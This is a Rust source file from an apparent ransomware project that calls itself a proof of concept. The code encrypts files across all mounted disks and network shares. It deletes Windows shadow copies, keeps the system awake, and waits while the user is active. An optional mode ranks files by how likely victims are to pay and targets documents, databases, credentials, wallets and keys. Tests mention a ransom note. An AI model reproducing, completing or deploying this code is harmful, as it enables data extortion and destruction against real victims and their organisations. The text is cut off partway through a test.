use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

use anyhow::Error;
use chacha20poly1305::aead::rand_core::RngCore;
use lazy_static::lazy_static;
use rand::rngs::OsRng;
use rayon::prelude::*;
use sysinfo::Disks;
use walkdir::WalkDir;

use crate::crypto::{self, Encrypter, KEY_LEN, STREAM_NONCE_LEN};
use crate::idle::IdleGate;

lazy_static! {
    /// Extensions that are intentionally left untouched.
    pub static ref EXTENSIONS: HashSet<&'static str> =
        HashSet::from(["txt", "png", "jpeg", "jpg"]);
}

/// Collect the files under `root` that should be encrypted:
/// regular files, not symlinks, not already `.enc`, not in the exclusion list,
/// not self-preserved (system dirs, key blobs, the running binary).
pub fn collect_encryptable(root: &Path) -> Vec<PathBuf> {
    WalkDir::new(root)
        .into_iter()
        .filter_entry(|entry| {
            if !entry.file_type().is_dir() || entry.path() == root {
                return true;
            }
            !crate::exclusions::is_pruned_dir(entry.path())
        })
        .filter_map(|e| e.ok())
        .filter(|entry| {
            entry.file_type().is_file()
                && !entry.file_type().is_symlink()
                && !crate::exclusions::is_preserved_file(entry.path())
                && !is_excluded(entry.path())
                && !is_already_encrypted(entry.path())
        })
        .map(|entry| entry.path().to_path_buf())
        .collect()
}

/// Collect the `.enc` files under `root` that should be decrypted.
pub fn collect_decryptable(root: &Path) -> Vec<PathBuf> {
    WalkDir::new(root)
        .into_iter()
        .filter_entry(|entry| {
            if !entry.file_type().is_dir() || entry.path() == root {
                return true;
            }
            !crate::exclusions::is_pruned_dir(entry.path())
        })
        .filter_map(|e| e.ok())
        .filter(|entry| {
            entry.file_type().is_file()
                && !crate::exclusions::is_preserved_file(entry.path())
                && is_already_encrypted(entry.path())
        })
        .map(|entry| entry.path().to_path_buf())
        .collect()
}

fn is_excluded(path: &Path) -> bool {
    match path.extension().and_then(|e| e.to_str()) {
        Some(ext) => EXTENSIONS.contains(ext),
        None => false,
    }
}

fn is_already_encrypted(path: &Path) -> bool {
    path.to_string_lossy().ends_with(".enc")
}

/// Encrypt every encryptable file under `root`. Returns the number of files
/// successfully encrypted. The original files are left intact (PoC behavior).
pub fn encrypt_tree(root: &Path, key: &[u8; KEY_LEN]) -> Result<u64, Error> {
    let gate = IdleGate::new();
    Ok(encrypt_files(collect_encryptable(root), key, &gate))
}

/// Encrypt the tree using a rayon `par_iter` over files.
pub fn encrypt_tree_parallel(root: &Path, key: &[u8; KEY_LEN]) -> Result<u64, Error> {
    let gate = IdleGate::new();
    Ok(encrypt_files_parallel(collect_encryptable(root), key, &gate))
}

/// Adaptive tree encryption: use rayon `par_iter` when there are enough files
/// to amortize pool scheduling, otherwise fall back to a single sequential
/// `Encrypter` (a handful of files is faster sequential).
pub fn encrypt_tree_auto(root: &Path, key: &[u8; KEY_LEN]) -> Result<u64, Error> {
    let gate = IdleGate::new();
    let files = collect_encryptable(root);
    Ok(if files.len() >= PARALLEL_THRESHOLD {
        encrypt_files_parallel(files, key, &gate)
    } else {
        encrypt_files(files, key, &gate)
    })
}

fn encrypt_files(files: Vec<PathBuf>, key: &[u8; KEY_LEN], gate: &IdleGate) -> u64 {
    let mut enc = Encrypter::new();
    let mut nonce = [0u8; STREAM_NONCE_LEN];
    let mut count = 0u64;

    for path in files {
        gate.pause_if_user_active();
        OsRng.fill_bytes(&mut nonce);
        let dst = crypto::encrypted_path(&path);
        match enc.encrypt_file(&path, &dst, key, &nonce) {
            Ok(_) => count += 1,
            Err(_) => {}
        }
    }
    count
}

fn encrypt_files_parallel(files: Vec<PathBuf>, key: &[u8; KEY_LEN], gate: &IdleGate) -> u64 {
    files
        .par_iter()
        .map_init(
            || Encrypter::new(),
            |enc, path| {
                gate.pause_if_user_active();
                let mut nonce = [0u8; STREAM_NONCE_LEN];
                OsRng.fill_bytes(&mut nonce);
                let dst = crypto::encrypted_path(path);
                match enc.encrypt_file(path, &dst, key, &nonce) {
                    Ok(_) => 1,
                    Err(_) => 0,
                }
            },
        )
        .sum()
}

/// Decrypt every `.enc` file under `root` back to its original path.
/// Returns the number of files successfully decrypted.
pub fn decrypt_tree(root: &Path, key: &[u8; KEY_LEN]) -> Result<u64, Error> {
    Ok(decrypt_files(collect_decryptable(root), key))
}

/// Decrypt the tree using a rayon `par_iter` over `.enc` files.
pub fn decrypt_tree_parallel(root: &Path, key: &[u8; KEY_LEN]) -> Result<u64, Error> {
    Ok(decrypt_files_parallel(collect_decryptable(root), key))
}

/// Adaptive tree decryption, mirroring [`encrypt_tree_auto`].
pub fn decrypt_tree_auto(root: &Path, key: &[u8; KEY_LEN]) -> Result<u64, Error> {
    let files = collect_decryptable(root);
    Ok(if files.len() >= PARALLEL_THRESHOLD {
        decrypt_files_parallel(files, key)
    } else {
        decrypt_files(files, key)
    })
}

fn decrypt_files(files: Vec<PathBuf>, key: &[u8; KEY_LEN]) -> u64 {
    let mut enc = Encrypter::new();
    let mut count = 0u64;

    for path in files {
        let Some(dst) = crypto::decrypted_path(&path) else {
            continue;
        };
        match enc.decrypt_file(&path, &dst, key) {
            Ok(_) => {
                // Restored successfully (AEAD-verified): drop the encrypted
                // original so the machine is left clean.
                let _ = fs::remove_file(&path);
                count += 1;
            }
            Err(_) => {}
        }
    }
    count
}

fn decrypt_files_parallel(files: Vec<PathBuf>, key: &[u8; KEY_LEN]) -> u64 {
    files
        .par_iter()
        .map_init(
            || Encrypter::new(),
            |enc, path| {
                let Some(dst) = crypto::decrypted_path(path) else {
                    return 0;
                };
                match enc.decrypt_file(path, &dst, key) {
                    Ok(_) => {
                        let _ = fs::remove_file(path);
                        1
                    }
                    Err(_) => 0,
                }
            },
        )
        .sum()
}

/// Below this many files, sequential beats rayon (pool scheduling overhead
/// dominates the work).
const PARALLEL_THRESHOLD: usize = 16;

/// Encrypt every encryptable file on every mounted disk (original PoC behavior,
/// made tolerant so a single bad file never aborts the run).
///
/// Disks are walked sequentially and each tree goes through the adaptive path
/// (`encrypt_tree_auto`). Nesting a disk-level `par_iter` around the file-level
/// rayon pool just adds contention on the same global pool, so we let the
/// tree-parallel path saturate all cores instead.
/// Reduce a list of root directories to a minimal set where no root is an
/// ancestor-or-equal of another. Keeps ancestors, drops descendants, so nested
/// mounts (e.g. an NFS share mounted under `/`) are only walked once when a
/// parent mount is also being walked. Runs once per run over the tiny root
/// list — there is no per-file or per-directory cost.
fn dedup_nested(roots: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = Vec::new();
    for root in roots {
        if out.iter().any(|r| root.starts_with(r)) {
            continue; // already covered by `r` (equal or an ancestor)
        }
        out.retain(|r| !r.starts_with(&root)); // drop descendants of `root`
        out.push(root);
    }
    out
}

pub fn encrypt_everything(key: &[u8; KEY_LEN]) {
    let gate = IdleGate::new();
    gate.wait_before_start();
    // vss-delete: best-effort, no-op unless enabled on Windows.
    crate::shadow::delete_shadow_copies();
    // pressure: hold the system awake for the whole run (released on drop).
    let _awake = crate::awake::hold_awake();
    #[cfg(feature = "priority-scan")]
    {
        let mut roots = discover_roots();
        roots.extend(crate::net_share::discover_net_roots());
        let entries = inventory(&roots);
        let _ = encrypt_priority(entries, key);
    }
    #[cfg(not(feature = "priority-scan"))]
    {
        let disks = Disks::new_with_refreshed_list();
        let mut roots: Vec<PathBuf> =
            disks.list().iter().map(|d| d.mount_point().to_path_buf()).collect();
        // Network shares (net-shares feature): a UNC path has no drive letter
        // and sysinfo may not surface every NFS/CIFS mount, so enumerate them
        // explicitly too.
        roots.extend(crate::net_share::discover_net_roots());
        // One startup pass drops any root covered by an ancestor mount, so a
        // nested share (e.g. NFS under `/`) is not walked twice.
        for root in dedup_nested(roots) {
            let _ = encrypt_tree_auto(&root, key);
        }
    }
}

/// Decrypt every `.enc` file on every mounted disk, plus any network share
/// roots from the `net-shares` feature.
pub fn decrypt_everything(key: &[u8; KEY_LEN]) {
    let disks = Disks::new_with_refreshed_list();
    let mut roots: Vec<PathBuf> =
        disks.list().iter().map(|d| d.mount_point().to_path_buf()).collect();
    roots.extend(crate::net_share::discover_net_roots());
    for root in dedup_nested(roots) {
        let _ = decrypt_tree_auto(&root, key);
    }
}

// ---------------------------------------------------------------------------
// Priority scan & encrypt-by-priority (SCAN_PRIORITY_PLAN.md).
// Everything below is only compiled when the `priority-scan` feature is on;
// a default build contains none of it.
// ---------------------------------------------------------------------------

/// One inventory entry produced by the (fast, content-free) scan phase.
#[cfg(feature = "priority-scan")]
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct FileEntry {
    pub path: PathBuf,
    pub size: u64,
    pub tier: u8,
    /// True when the file lives on a removable/network filesystem; these are
    /// scheduled last so a hung share never stalls the initial sweep.
    pub deferred: bool,
}

/// Highest-value extensions first (tier 0 = most likely to be paid for).
#[cfg(feature = "priority-scan")]
const TIER_0_EXT: &[&str] = &[
    "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "odt", "ods", "odp", "rtf",
    "csv", "sql", "db", "sqlite", "mdb", "accdb", "dbf", "pst", "ost", "eml", "msg",
    "txt",
];

/// High value — archives, code, config, credentials.
#[cfg(feature = "priority-scan")]
const TIER_1_EXT: &[&str] = &[
    "zip", "rar", "7z", "tar", "gz", "bz2", "bak", "key", "pem", "crt", "cfg", "conf",
    "json", "yml", "yaml", "env", "wallet", "dat", "rs", "py", "java", "c", "cpp",
    "cs", "js", "ts", "go", "php", "rb",
];

/// Medium value — media.
#[cfg(feature = "priority-scan")]
const TIER_2_EXT: &[&str] = &[
    "mp3", "flac", "wav", "mp4", "mkv", "mov", "avi", "jpg", "jpeg", "png", "gif",
    "tiff", "raw", "heic",
];

/// File-name substrings that promote an unknown/extensionless file to tier 0.
#[cfg(feature = "priority-scan")]
const KEYWORDS: &[&str] = &[
    "password", "passwd", "credential", "secret", "login",
    "wallet", "seed", "mnemonic", "recovery", "2fa", "otp",
    "id_rsa", "id_ed25519", "pem", "key",
    "backup", "export", "dump", "archive",
    "database", "db", "mail", "inbox", "contacts",
    "invoice", "tax", "finance", "payroll", "contract",
    "note", "diary", "journal", "document",
    "keychain", "vault", "keepass", "kdbx",
];

/// Extension -> priority tier (lower = encrypted first). Unknown => tier 3.
#[cfg(feature = "priority-scan")]
fn tier_for(path: &Path) -> u8 {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    if TIER_0_EXT.contains(&ext.as_str()) {
        return 0;
    }
    if TIER_1_EXT.contains(&ext.as_str()) {
        return 1;
    }
    if TIER_2_EXT.contains(&ext.as_str()) {
        return 2;
    }
    3
}

/// Keyword boost: `true` when the file stem matches a high-value keyword.
/// A hit can only raise a file's tier (promotes it to tier 0), never demote it.
#[cfg(feature = "priority-scan")]
fn tier_from_keywords(path: &Path) -> bool {
    let Some(stem) = path.file_stem().and_then(|s| s.to_str()) else {
        return false;
    };
    let stem = stem.to_lowercase();
    KEYWORDS.iter().any(|kw| stem.contains(kw))
}

/// User-document directories: files under one of these get a one-step tier
/// boost (never below tier 0).
#[cfg(feature = "priority-scan")]
fn is_user_docs_dir(path: &Path) -> bool {
    const DOC_DIRS: &[&str] = &["documents", "desktop", "downloads"];
    path.parent()
        .map(|parent| {
            parent.components().any(|c| {
                if let std::path::Component::Normal(s) = c {
                    let s = s.to_string_lossy();
                    DOC_DIRS.iter().any(|d| s.eq_ignore_ascii_case(d))
                } else {
                    false
                }
            })
        })
        .unwrap_or(false)
}

/// Combined tier: extension tier, keyword boost, then the directory boost.
#[cfg(feature = "priority-scan")]
fn tier_of(path: &Path) -> u8 {
    let mut tier = tier_for(path);
    if tier_from_keywords(path) {
        tier = 0;
    }
    if is_user_docs_dir(path) {
        tier = tier.saturating_sub(1);
    }
    tier
}

/// `(mount_point, filesystem_type)` for every disk known to sysinfo.
#[cfg(feature = "priority-scan")]
fn disk_mounts() -> Vec<(PathBuf, String)> {
    let disks = Disks::new_with_refreshed_list();
    disks
        .list()
        .iter()
        .map(|d| {
            let fs = d.file_system().to_string_lossy().into_owned();
            (d.mount_point().to_path_buf(), fs)
        })
        .collect()
}

#[cfg(feature = "priority-scan")]
fn is_pseudo_fs(fs: &str) -> bool {
    const PSEUDO: &[&str] = &[
        "proc", "sysfs", "devtmpfs", "tmpfs", "ramfs", "devfs", "devpts", "overlay",
        "aufs", "tracefs", "bpf", "debugfs", "securityfs", "pstore", "cgroup",
        "cgroup2", "configfs", "fusectl", "mqueue", "hugetlbfs", "rpc_pipefs",
        "autofs", "efivarfs", "binfmt_misc", "nsfs",
    ];
    PSEUDO.iter().any(|p| p.eq_ignore_ascii_case(fs))
}

#[cfg(feature = "priority-scan")]
fn is_remote_fs(fs: &str) -> bool {
    const REMOTE: &[&str] = &[
        "nfs", "nfs4", "cifs", "smb", "smb2", "fuse.sshfs", "9p", "afpfs", "webdav",
    ];
    REMOTE.iter().any(|p| p.eq_ignore_ascii_case(fs))
}

/// Mount points on pseudo-filesystems — never walked.
#[cfg(feature = "priority-scan")]
fn pseudo_mount_points() -> HashSet<PathBuf> {
    disk_mounts()
        .into_iter()
        .filter(|(_, fs)| is_pseudo_fs(fs))
        .map(|(p, _)| p)
        .collect()
}

/// Mount points on removable/network filesystems — deferred to phase-2 end.
#[cfg(feature = "priority-scan")]
fn deferred_mount_points() -> HashSet<PathBuf> {
    let disks = Disks::new_with_refreshed_list();
    disks
        .list()
        .iter()
        .filter(|d| d.is_removable() || is_remote_fs(&d.file_system().to_string_lossy()))
        .map(|d| d.mount_point().to_path_buf())
        .collect()
}

/// System directories that are never valuable enough to walk. Windows has a
/// fixed set; on Unix pseudo-filesystems are pruned by mount point instead
/// (name-based pruning would false-positive on e.g. `~/dev`, `projects/tmp`).
#[cfg(feature = "priority-scan")]
fn is_system_dir_name(name: &std::ffi::OsStr) -> bool {
    #[cfg(windows)]
    {
        const SYSTEM_DIRS: &[&str] = &[
            "windows", "program files", "program files (x86)", "programdata",
            "$recycle.bin", "system volume information",
        ];
        let lower = name.to_string_lossy().to_ascii_lowercase();
        SYSTEM_DIRS.contains(&lower.as_str())
    }
    #[cfg(target_os = "macos")]
    {
        name.to_string_lossy().eq_ignore_ascii_case("System")
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        false
    }
}

/// Path prefixes that are known junk and skipped entirely (cache/temp dirs
/// that are not separate mounts).
#[cfg(feature = "priority-scan")]
fn is_prune_path(path: &Path) -> bool {
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        const PRUNE: &[&str] =
            &["/var/cache", "/var/tmp", "/var/run", "/var/lock", "/tmp", "/run"];
        let p = path.to_string_lossy();
        PRUNE.iter().any(|prefix| p.eq_ignore_ascii_case(prefix) || p.starts_with(&format!("{}/", prefix)))
    }
    #[cfg(target_os = "macos")]
    {
        const PRUNE: &[&str] = &["/private/var/vm"];
        let p = path.to_string_lossy();
        PRUNE.iter().any(|prefix| p.eq_ignore_ascii_case(prefix) || p.starts_with(&format!("{}/", prefix)))
    }
    #[cfg(windows)]
    {
        let _ = path;
        false
    }
}

#[cfg(feature = "priority-scan")]
fn push_unique(roots: &mut Vec<PathBuf>, root: PathBuf) {
    if !roots.contains(&root) {
        roots.push(root);
    }
}

/// OS-aware high-value roots, plus every non-pseudo mounted filesystem as a
/// catch-all so the original "encrypt everything on disk" behavior is kept.
#[cfg(feature = "priority-scan")]
pub fn discover_roots() -> Vec<PathBuf> {
    let mut roots = Vec::new();

    #[cfg(windows)]
    push_windows_roots(&mut roots);
    #[cfg(target_os = "macos")]
    push_macos_roots(&mut roots);
    #[cfg(all(unix, not(target_os = "macos")))]
    push_unix_roots(&mut roots);

    for (mount, fs) in disk_mounts() {
        if !is_pseudo_fs(&fs) {
            push_unique(&mut roots, mount);
        }
    }

    roots
}

#[cfg(all(unix, not(target_os = "macos"), feature = "priority-scan"))]
fn push_unix_roots(roots: &mut Vec<PathBuf>) {
    let mut candidates = vec![
        PathBuf::from("/home"),
        PathBuf::from("/root"),
        PathBuf::from("/etc"),
        PathBuf::from("/var/lib"),
        PathBuf::from("/opt"),
        PathBuf::from("/srv"),
    ];
    if let Some(ud) = directories::UserDirs::new() {
        for dir in [ud.desktop_dir(), ud.document_dir(), ud.download_dir(),
                    ud.picture_dir(), ud.video_dir(), ud.audio_dir()]
            .into_iter()
            .flatten()
        {
            candidates.push(dir.to_path_buf());
        }
        candidates.push(ud.home_dir().to_path_buf());
    }
    for c in candidates {
        if c.is_dir() {
            push_unique(roots, c);
        }
    }
}

#[cfg(all(windows, feature = "priority-scan"))]
fn push_windows_roots(roots: &mut Vec<PathBuf>) {
    if let Some(ud) = directories::UserDirs::new() {
        for dir in [ud.desktop_dir(), ud.document_dir(), ud.download_dir(),
                    ud.picture_dir(), ud.video_dir(), ud.audio_dir()]
            .into_iter()
            .flatten()
        {
            push_unique(roots, dir.to_path_buf());
        }
        push_unique(roots, ud.home_dir().to_path_buf());
    }
    // Other user profiles under C:\Users (drop Default/Public).
    let users_dir = PathBuf::from("C:\\Users");
    if let Ok(entries) = std::fs::read_dir(&users_dir) {
        for e in entries.filter_map(|e| e.ok()) {
            let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
            let name = e.file_name().to_string_lossy().into_owned();
            if is_dir && name != "Default" && name != "Public" {
                push_unique(roots, e.path());
            }
        }
    }
}

#[cfg(all(target_os = "macos", feature = "priority-scan"))]
fn push_macos_roots(roots: &mut Vec<PathBuf>) {
    let mut candidates = vec![PathBuf::from("/Library/Application Support")];
    if let Some(ud) = directories::UserDirs::new() {
        for dir in [ud.desktop_dir(), ud.document_dir(), ud.download_dir(),
                    ud.picture_dir(), ud.video_dir(), ud.audio_dir()]
            .into_iter()
            .flatten()
        {
            candidates.push(dir.to_path_buf());
        }
        candidates.push(ud.home_dir().to_path_buf());
    }
    for c in candidates {
        if c.is_dir() {
            push_unique(roots, c);
        }
    }
}

/// Fast inventory pass: a readdir + name/size pass that produces tiered
/// entries without ever opening file contents.
#[cfg(feature = "priority-scan")]
pub fn inventory(roots: &[PathBuf]) -> Vec<FileEntry> {
    let pseudo_mounts = pseudo_mount_points();
    let deferred_mounts = deferred_mount_points();
    let net_roots = crate::net_share::discover_net_roots();
    let seeded: HashSet<PathBuf> = roots.iter().cloned().collect();

    roots
        .par_iter()
        .flat_map_iter(|root| {
            // Borrow so the inner `move` closure captures a `Copy` reference
            // instead of moving the set out of this `Fn` closure.
            let deferred_mounts = &deferred_mounts;
            let net_roots = &net_roots;
            let root_deferred = deferred_mounts.iter().any(|m| root.starts_with(m));
            WalkDir::new(root)
                .into_iter()
                .filter_entry(|entry| {
                    if !entry.file_type().is_dir() {
                        return true;
                    }
                    let p = entry.path();
                    if p == root {
                        return true;
                    }
                    if is_system_dir_name(entry.file_name())
                        || is_prune_path(p)
                        || crate::exclusions::is_pruned_dir(p)
                    {
                        return false;
                    }
                    if pseudo_mounts.contains(p) || seeded.contains(p) {
                        return false;
                    }
                    true
                })
                .filter_map(move |e| {
                    let entry = e.ok()?;
                    let ft = entry.file_type();
                    if !ft.is_file() || ft.is_symlink() {
                        return None;
                    }
                    if crate::exclusions::is_preserved_file(entry.path())
                        || is_excluded(entry.path())
                        || is_already_encrypted(entry.path())
                    {
                        return None;
                    }
                    let path = entry.path().to_path_buf();
                    let size = entry.metadata().ok()?.len();
                    let tier = tier_of(&path);
                    let deferred = root_deferred
                        || deferred_mounts.iter().any(|m| path.starts_with(m))
                        || net_roots.iter().any(|r| path.starts_with(r));
                    Some(FileEntry { path, size, tier, deferred })
                })
                .collect::<Vec<_>>()
        })
        .collect()
}

/// Order entries for encryption: non-deferred first, then by tier, then by
/// size ascending (small files first for fastest visible impact).
#[cfg(feature = "priority-scan")]
pub fn sort_priority(entries: &mut [FileEntry]) {
    entries.sort_by_key(|e| (e.deferred, e.tier, e.size));
}

/// Encrypt entries tier-by-tier (deferred mounts last) through the existing
/// rayon path, so a partial run still locks the most valuable files first.
#[cfg(feature = "priority-scan")]
pub fn encrypt_priority(entries: Vec<FileEntry>, key: &[u8; KEY_LEN]) -> u64 {
    let mut entries = entries;
    sort_priority(&mut entries);
    let mut total = 0u64;
    for deferred in [false, true] {
        for tier in 0u8..=3 {
            let batch: Vec<PathBuf> = entries
                .iter()
                .filter(|e| e.deferred == deferred && e.tier == tier)
                .map(|e| e.path.clone())
                .collect();
            if !batch.is_empty() {
                let gate = IdleGate::new();
                total += encrypt_files_parallel(batch, key, &gate);
            }
        }
    }
    total
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::crypto::KEY_LEN;
    use rand::rngs::OsRng;
    use tempfile::tempdir;

    fn random_key() -> [u8; KEY_LEN] {
        let mut key = [0u8; KEY_LEN];
        OsRng.fill_bytes(&mut key);
        key
    }

    #[test]
    fn dedup_nested_keeps_ancestors_drops_descendants() {
        let roots = vec![
            PathBuf::from("/home"),
            PathBuf::from("/home/user/docs"),
            PathBuf::from("/home/user/pics"),
            PathBuf::from("/tmp"),
            PathBuf::from("/tmp"),
        ];
        let mut out: Vec<String> = dedup_nested(roots)
            .iter()
            .map(|p| p.to_string_lossy().into_owned())
            .collect();
        out.sort();
        assert_eq!(out, vec!["/home".to_string(), "/tmp".to_string()]);
    }

    #[test]
    fn dedup_nested_handles_ancestor_arriving_last() {
        // `/` added after its descendant: the descendant is pruned.
        let roots = vec![PathBuf::from("/mnt/nfs"), PathBuf::from("/")];
        let out: Vec<String> = dedup_nested(roots)
            .iter()
            .map(|p| p.to_string_lossy().into_owned())
            .collect();
        assert_eq!(out, vec!["/".to_string()]);
    }

    #[test]
    fn dedup_nested_keeps_unrelated_roots() {
        let roots = vec![
            PathBuf::from("C:\\"),
            PathBuf::from("C:\\Users\\alice"),
            PathBuf::from("D:\\"),
            PathBuf::from(r"\\server\share"),
        ];
        let out: Vec<String> = dedup_nested(roots)
            .iter()
            .map(|p| p.to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            out,
            vec![
                "C:\\".to_string(),
                "D:\\".to_string(),
                r"\\server\share".to_string(),
            ]
        );
    }

    fn write_tree(root: &std::path::Path) {
        // exclusions: txt, png, jpeg, jpg
        let files = [
            ("docs/notes.txt", b"plain text".as_slice()),
            ("docs/report.md", b"# report".as_slice()),
            ("docs/data.json", br#"{"a":1}"#),
            ("img/photo.png", b"\x89PNG fake".as_slice()),
            ("img/photo.jpg", b"jpeg fake".as_slice()),
            ("img/vector.svg", b"<svg/>".as_slice()),
            ("bin/archive.zip", b"PK fake".as_slice()),
        ];
        for (rel, content) in files {
            let p = root.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, content).unwrap();
        }
    }

    #[test]
    fn collect_encryptable_excludes_listed_extensions() {
        let dir = tempdir().unwrap();
        write_tree(dir.path());
        let files = collect_encryptable(dir.path());
        let names: Vec<String> = files
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert!(names.contains(&"report.md".into()));
        assert!(names.contains(&"data.json".into()));
        assert!(names.contains(&"vector.svg".into()));
        assert!(names.contains(&"archive.zip".into()));
        // txt/png/jpg are excluded
        assert!(!names.contains(&"notes.txt".into()));
        assert!(!names.contains(&"photo.png".into()));
        assert!(!names.contains(&"photo.jpg".into()));
    }

    #[test]
    fn collect_encryptable_skips_preserved_files() {
        let dir = tempdir().unwrap();
        write_tree(dir.path());
        // Key blobs / ransom note / paging files must never be encrypted.
        for name in ["key.part1", "key.part2", "READ_ME.txt", "pagefile.sys"] {
            std::fs::write(dir.path().join(name), b"keep me").unwrap();
        }
        let files = collect_encryptable(dir.path());
        let names: Vec<String> = files
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        for name in ["key.part1", "key.part2", "READ_ME.txt", "pagefile.sys"] {
            assert!(!names.contains(&name.to_string()), "{name} should be preserved");
        }
        // Regular files are still picked up.
        assert!(names.contains(&"report.md".into()));
    }

    #[test]
    fn decrypt_removes_source_enc_files() {
        let dir = tempdir().unwrap();
        write_tree(dir.path());
        let key = random_key();
        encrypt_tree(dir.path(), &key).unwrap();
        assert!(dir.path().join("docs/report.md.enc").exists());

        let decrypted = decrypt_tree(dir.path(), &key).unwrap();
        assert!(decrypted >= 1);
        // Successfully restored files have their .enc original removed.
        assert!(!dir.path().join("docs/report.md.enc").exists());
        assert!(dir.path().join("docs/report.md").exists());
    }

    #[test]
    fn excludes_listed_extensions_encrypt() {
        let dir = tempdir().unwrap();
        write_tree(dir.path());
        let key = random_key();
        encrypt_tree(dir.path(), &key).unwrap();

        assert!(!dir.path().join("docs/notes.txt.enc").exists());
        assert!(!dir.path().join("img/photo.png.enc").exists());
        assert!(!dir.path().join("img/photo.jpg.enc").exists());
        assert!(dir.path().join("docs/report.md.enc").exists());
        assert!(dir.path().join("docs/data.json.enc").exists());
        assert!(dir.path().join("img/vector.svg.enc").exists());
        assert!(dir.path().join("bin/archive.zip.enc").exists());
    }

    #[test]
    fn full_tree_encrypt_decrypt_roundtrip() {
        let dir = tempdir().unwrap();
        write_tree(dir.path());

        let before: Vec<(String, Vec<u8>)> = collect_encryptable(dir.path())
            .iter()
            .map(|p| {
                let rel = p.strip_prefix(dir.path()).unwrap().to_string_lossy().into_owned();
                (rel, std::fs::read(p).unwrap())
            })
            .collect();

        let key = random_key();
        let encrypted = encrypt_tree(dir.path(), &key).unwrap();
        assert_eq!(encrypted as usize, before.len());

        let decrypted = decrypt_tree(dir.path(), &key).unwrap();
        assert_eq!(decrypted as usize, before.len());

        for (rel, original) in before {
            let restored = std::fs::read(dir.path().join(&rel)).unwrap();
            assert_eq!(restored, original, "mismatch for {}", rel);
        }
    }

    #[test]
    fn file_already_has_enc_extension_not_double_encrypted() {
        let dir = tempdir().unwrap();
        std::fs::write(dir.path().join("secret.txt.enc"), b"already encrypted").unwrap();
        let key = random_key();
        encrypt_tree(dir.path(), &key).unwrap();
        // The .enc file must not be re-encrypted into secret.txt.enc.enc
        assert!(!dir.path().join("secret.txt.enc.enc").exists());
        assert_eq!(std::fs::read(dir.path().join("secret.txt.enc")).unwrap(), b"already encrypted");
    }

    #[test]
    fn read_only_file_does_not_abort_run() {
        let dir = tempdir().unwrap();
        std::fs::write(dir.path().join("docs.md"), b"read only content").unwrap();
        let ro = dir.path().join("locked.bin");
        std::fs::write(&ro, b"locked").unwrap();
        let mut perms = std::fs::metadata(&ro).unwrap().permissions();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            perms.set_mode(0o444);
        }
        #[cfg(windows)]
        {
            perms.set_readonly(true);
        }
        std::fs::set_permissions(&ro, perms).unwrap();

        let key = random_key();
        // Should not panic and should still process other files.
        let count = encrypt_tree(dir.path(), &key).unwrap();
        assert_eq!(count, 2); // docs.md + locked.bin both encryptable
        let _ = std::fs::remove_dir_all(dir.path());
    }

    #[cfg(unix)]
    #[test]
    fn symlink_to_file_is_skipped() {
        use std::os::unix::fs::symlink;
        let dir = tempdir().unwrap();
        let target = dir.path().join("target.txt");
        std::fs::write(&target, b"target content").unwrap();
        let link = dir.path().join("link.txt");
        symlink(&target, &link).unwrap();

        let key = random_key();
        encrypt_tree(dir.path(), &key).unwrap();
        // walkdir without follow_links treats the symlink as a symlink entry,
        // so it is not encrypted as a regular file.
        assert!(!dir.path().join("link.txt.enc").exists());
        // But the real file is still encrypted.
        assert!(dir.path().join("target.txt.enc").exists());
    }

    #[test]
    fn decrypt_tree_ignores_non_enc_files() {
        let dir = tempdir().unwrap();
        std::fs::write(dir.path().join("plain.txt"), b"no enc suffix").unwrap();
        let key = random_key();
        let decrypted = decrypt_tree(dir.path(), &key).unwrap();
        assert_eq!(decrypted, 0);
        assert_eq!(std::fs::read(dir.path().join("plain.txt")).unwrap(), b"no enc suffix");
    }

    #[test]
    fn auto_path_matches_sequential_result() {
        // Large enough tree to trigger the parallel branch.
        let dir = tempdir().unwrap();
        for i in 0..40 {
            let p = dir.path().join(format!("batch/file_{:03}.bin", i));
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, vec![0x55u8; 8192 + i]).unwrap();
        }
        let key = random_key();
        let parallel = encrypt_tree_auto(dir.path(), &key).unwrap();
        assert_eq!(parallel, 40);
        assert_eq!(decrypt_tree_auto(dir.path(), &key).unwrap(), 40);

        // Small tree must fall back to sequential without panicking.
        let small = tempdir().unwrap();
        std::fs::write(small.path().join("a.bin"), b"a").unwrap();
        std::fs::write(small.path().join("b.bin"), b"b").unwrap();
        assert_eq!(encrypt_tree_auto(small.path(), &key).unwrap(), 2);
        assert_eq!(decrypt_tree_auto(small.path(), &key).unwrap(), 2);
    }
}

#[cfg(all(test, feature = "priority-scan"))]
mod priority_tests {
    use super::*;
    use crate::crypto::KEY_LEN;
    use rand::rngs::OsRng;
    use tempfile::tempdir;

    fn random_key() -> [u8; KEY_LEN] {
        let mut key = [0u8; KEY_LEN];
        OsRng.fill_bytes(&mut key);
        key
    }

    #[test]
    fn tier_for_classifies_representative_extensions() {
        assert_eq!(tier_for(Path::new("invoice.pdf")), 0);
        assert_eq!(tier_for(Path::new("report.docx")), 0);
        assert_eq!(tier_for(Path::new("data.sqlite")), 0);
        assert_eq!(tier_for(Path::new("backup.zip")), 1);
        assert_eq!(tier_for(Path::new("config.json")), 1);
        assert_eq!(tier_for(Path::new("main.rs")), 1);
        assert_eq!(tier_for(Path::new("id_rsa")), 3); // no extension
        assert_eq!(tier_for(Path::new("track.mp3")), 2);
        assert_eq!(tier_for(Path::new("movie.mp4")), 2);
        assert_eq!(tier_for(Path::new("mystery.xyz")), 3);
        assert_eq!(tier_for(Path::new("no_extension")), 3);
    }

    #[test]
    fn tier_for_is_case_insensitive() {
        assert_eq!(tier_for(Path::new("REPORT.PDF")), 0);
        assert_eq!(tier_for(Path::new("Archive.ZIP")), 1);
